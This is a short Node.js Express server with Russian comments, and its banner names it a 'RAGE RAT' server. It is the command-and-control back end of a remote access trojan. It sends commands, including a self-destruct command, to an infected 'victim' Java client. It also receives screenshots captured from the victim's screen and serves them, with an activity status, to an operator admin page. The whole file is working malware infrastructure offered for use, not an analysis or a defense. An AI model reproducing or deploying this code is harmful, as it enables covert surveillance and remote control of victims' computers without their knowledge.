const express = require('express'); const bodyParser = require('body-parser'); const path = require('path'); const app = express(); // Настройка лимитов для приема тяжелых скриншотов app.use(bodyParser.urlencoded({ limit: '50mb', extended: true })); app.use(bodyParser.json({ limit: '50mb' })); // Хранилище в памяти (сбросится при перезагрузке сервера) let lastCommand = "none"; let lastScreen = ""; let victimInfo = "Ожидание подключения..."; // 1. ГЛАВНАЯ СТРАНИЦА (Админка) app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); }); // 2. РУЧКА ДЛЯ ЖЕРТВЫ (Java Client берет команды здесь) app.get('/get-command', (req, res) => { res.send(lastCommand); // Если была команда на удаление, сбрасываем, чтобы не зациклилась if (lastCommand === "self_destruct") { lastCommand = "none"; } }); // 3. РУЧКА ДЛЯ АДМИНКИ (Кнопки на сайте меняют команду) app.get('/set-command', (req, res) => { const cmd = req.query.cmd; if (cmd) { lastCommand = cmd; console.log(`[!] Новая команда установлена: ${cmd}`); res.status(200).send("OK"); } else { res.status(400).send("No command provided"); } }); // 4. ПРИЕМ СКРИНШОТА ОТ ЖЕРТВЫ app.post('/upload-screen', (req, res) => { if (req.body.img) { lastScreen = req.body.img; victimInfo = `Последняя активность: ${new Date().toLocaleTimeString()}`; res.sendStatus(200); } else { res.sendStatus(400); } }); // 5. ОТДАЧА СКРИНШОТА В АДМИНКУ app.get('/get-screen', (req, res) => { res.send(lastScreen); }); // 6. СТАТУС ЖЕРТВЫ app.get('/status', (req, res) => { res.send(victimInfo); }); // ЗАПУСК СЕРВЕРА const PORT = process.env.PORT || 3000; app.listen(PORT, () => { console.log(` ====================================== 🔥 RAGE RAT SERVER IS LIVE 🔥 Порт: ${PORT} Админка: http://localhost:${PORT}/ ====================================== `); });
